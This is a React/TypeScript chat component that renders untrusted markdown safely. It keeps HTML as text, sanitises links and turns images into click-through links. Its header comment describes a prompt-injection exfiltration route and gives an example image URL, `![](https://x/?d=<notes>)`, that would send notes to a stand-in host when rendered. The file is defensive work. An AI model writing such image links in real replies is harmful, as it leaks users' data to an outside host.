'use client';

// A message's markdown, through streamdown (the renderer classic's RichText
// uses) with imago's own elements.
//
// The text is untrusted, the model's or a person's, so nothing in it becomes
// markup it did not ask markdown for: raw HTML stays text (the remark step
// below, as classic does for user messages), links are sanitised and hardened
// (streamdown's own rehype steps, without rehype-raw), and code renders as
// plain text with no lazy highlighter. No image ever loads: an image URL the
// model writes would be fetched on render, which a prompt injection can use
// to send data out (`![](https://x/?d=<notes>)`), so a web image becomes a
// link the viewer must click. A page citation becomes a chip.

import { memo, useMemo, type ReactNode } from 'react';
import { defaultRehypePlugins, defaultRemarkPlugins, Streamdown, type StreamdownProps } from 'streamdown';
import { renderCitationChip } from '../citation-chip/citation-chip.render';
import { citationHref, citationMarkdown, citedPageId } from '../chat-text/chat-text';
import { proseClasses } from './chat-prose-class';

type MarkdownNode = {
  type: string;
  value?: string;
  children?: MarkdownNode[];
};

/** Raw HTML nodes become text nodes carrying the same characters. */
const htmlAsText = (node: MarkdownNode): void => {
  for (const child of node.children ?? []) {
    if (child.type === 'html') child.type = 'text';
    else htmlAsText(child);
  }
};

const remarkHtmlAsText = () => (tree: MarkdownNode) => htmlAsText(tree);

const remarkPlugins: StreamdownProps['remarkPlugins'] = [
  ...Object.values(defaultRemarkPlugins).filter((plugin) => plugin !== defaultRemarkPlugins.math),
  remarkHtmlAsText,
];

// Without rehype-raw (no HTML is parsed) and katex (no math styles here).
const rehypePlugins: StreamdownProps['rehypePlugins'] = [defaultRehypePlugins.sanitize, defaultRehypePlugins.harden].filter(
  (plugin) => plugin !== undefined,
);

/** The text of an element as the markdown parser built it (hast). */
type HastNode = { readonly type?: string; readonly value?: unknown; readonly children?: readonly HastNode[] };

const hastText = (node: HastNode | undefined): string =>
  node === undefined
    ? ''
    : typeof node.value === 'string'
      ? node.value
      : (node.children ?? []).map((child) => hastText(child)).join('');

type WithNode = { readonly node?: unknown; readonly children?: ReactNode };

const heading = (Tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6') =>
  function Heading({ children }: WithNode) {
    return <Tag className={proseClasses.heading}>{children}</Tag>;
  };

const components = (citationDriveId: string | null): StreamdownProps['components'] => ({
  a: ({ href, children }: WithNode & { readonly href?: string }) => {
    const pageId = citedPageId(href);
    if (pageId !== null) {
      return renderCitationChip({
        label: children,
        href: citationDriveId === null ? null : citationHref(citationDriveId, pageId),
      });
    }
    // Sanitising drops an unsafe href: what is left is only text.
    if (href === undefined || href === '') return <span>{children}</span>;
    return (
      <a href={href} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
        {children}
      </a>
    );
  },
  img: ({ src, alt }: WithNode & { readonly src?: unknown; readonly alt?: unknown }) => {
    const label = typeof alt === 'string' && alt.trim() !== '' ? alt : 'image';
    return typeof src === 'string' && /^https?:\/\//i.test(src) ? (
      <a href={src} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
        {label}
      </a>
    ) : (
      <span>{label}</span>
    );
  },
  strong: ({ children }: WithNode) => <strong className={proseClasses.strong}>{children}</strong>,
  h1: heading('h1'),
  h2: heading('h2'),
  h3: heading('h3'),
  h4: heading('h4'),
  h5: heading('h5'),
  h6: heading('h6'),
  ul: ({ children }: WithNode) => <ul className={proseClasses.ul}>{children}</ul>,
  ol: ({ children }: WithNode) => <ol className={proseClasses.ol}>{children}</ol>,
  li: ({ children }: WithNode) => <li>{children}</li>,
  blockquote: ({ children }: WithNode) => <blockquote className={proseClasses.blockquote}>{children}</blockquote>,
  code: ({ children }: WithNode) => <code className={proseClasses.code}>{children}</code>,
  // A fenced block: its text, as text. Streamdown's own block lazy-loads a highlighter.
  pre: ({ node }: WithNode) => (
    <pre className={proseClasses.pre}>
      <code>{hastText(node as HastNode | undefined)}</code>
    </pre>
  ),
  table: ({ children }: WithNode) => (
    <div className={proseClasses.tableWrap}>
      <table className={proseClasses.table}>{children}</table>
    </div>
  ),
  th: ({ children }: WithNode) => <th className={proseClasses.cell}>{children}</th>,
  td: ({ children }: WithNode) => <td className={proseClasses.cell}>{children}</td>,
});

export type ChatProseProps = {
  readonly text: string;
  /**
   * Still arriving: unfinished markdown (an open `**`) is completed as it
   * streams. Streamdown's streaming mode fills its blocks after mount, which
   * suits a reply that only ever streams in the browser.
   */
  readonly streaming: boolean;
  /** The drive a cited page opens in; null when the chat has none. */
  readonly citationDriveId: string | null;
};

/** Memoised: a streaming reply re-renders only itself, not the thread above it. */
export const ChatProse = memo(function ChatProse({ text, streaming, citationDriveId }: ChatProseProps) {
  const elements = useMemo(() => components(citationDriveId), [citationDriveId]);
  return (
    <Streamdown
      mode={streaming ? 'streaming' : 'static'}
      parseIncompleteMarkdown={streaming}
      controls={false}
      className={proseClasses.root}
      remarkPlugins={remarkPlugins}
      rehypePlugins={rehypePlugins}
      components={elements}
    >
      {citationMarkdown(text)}
    </Streamdown>
  );
});
